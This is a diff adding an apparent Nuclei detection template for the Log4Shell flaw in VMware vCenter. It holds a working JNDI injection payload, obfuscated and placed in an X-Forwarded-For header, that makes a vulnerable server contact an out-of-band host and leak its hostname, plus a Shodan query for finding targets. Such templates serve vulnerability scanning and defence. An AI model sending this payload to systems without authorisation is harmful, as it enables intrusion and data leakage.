@@ -1,0 +1,53 @@
+id: vmware-vcenter-log4j-jndi-rce
+
+info:
+  name: VMware VCenter - Remote Code Execution (Apache Log4j)
+  author: _0xf4n9x_
+  severity: critical
+  description: |
+    VMware VCenter is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://twitter.com/tnpitsecurity/status/1469429810216771589
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:vmware:vcenter_server:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: title:"VMware VCenter"
+    product: vcenter_server
+    vendor: vmware
+  tags: cve,cve2021,rce,jndi,log4j,vcenter,vmware,oast,kev
+
+http:
+  - raw:
+      - |
+        GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
+        part: interactsh_request
+# digest: 4a0a00473045022100bbcd68342ade5add463026e3c906357dac7514b1f9bb9827337f57dcfad7992102202708199bdfb5504b8d2dffc4bdc15f82cc54f9c890b16df4f40dd6e8510efa10:922c64590222798bb761d5b6d8e72950
